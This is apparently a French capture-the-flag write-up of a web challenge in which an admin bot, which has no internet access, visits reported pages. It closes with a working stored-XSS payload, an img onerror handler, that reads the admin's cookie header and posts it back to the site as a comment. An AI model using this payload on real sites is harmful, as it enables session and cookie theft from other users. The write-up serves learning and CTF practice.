

![](../img/Pasted%20image%2020260517122449.png)

Dans ce challenge nous pouvons voir un petit lore sympa créé par rootcan (merci encore pour ce challenge qui ma casser la tête haha).

Nous pouvons voir que signaler un problème nous permet donc de faire cliquez ou de faire chargé la page à un administrateur(ici un bot admin) il nous ai précisé que le bot n'as accès à internet. Pour des raisons de sécurité mais aussi pour un vrai challenge bien dur haha. On va devoir donc faire ce qu'on appel du same origin et faire en sorte que le bot admin fasse tout de lui même ou soit renvoie son cookie.

Comment on peut-être sûr que ce sera le chemin du cookie à prendre ? 

Grâce à cette phrase : 

`_Signaler un problème" vous permettra d'amener un admin possédant un cookie plutôt intéressant sur la page_`


Tout d'abord voyons voir à quoi ressemble le site web qui nous ai mis à notre disposition.

![](../img/Pasted%20image%2020260517123901.png)
![](../img/Pasted%20image%2020260517124000.png)

On peut voir que tout d'abord il faut établir le lien(qui on verra nous servira à quelques chose)

Puis deuxième étape il faut transmettre une dépêche qui celui ci sera lisible dans les dépêche reçu. 
Nous pouvons mettre test par exemple pour voir la dépêche reçu.

![](../img/Pasted%20image%2020260517124844.png)


Essayons de faire une XSS classique pour voir si le champs est vulnérable.




Solution finale : 


```javascript
<img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(r=>{var sc=r.headers.get('set-cookie');fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=SC='+encodeURIComponent(sc)})})">
```

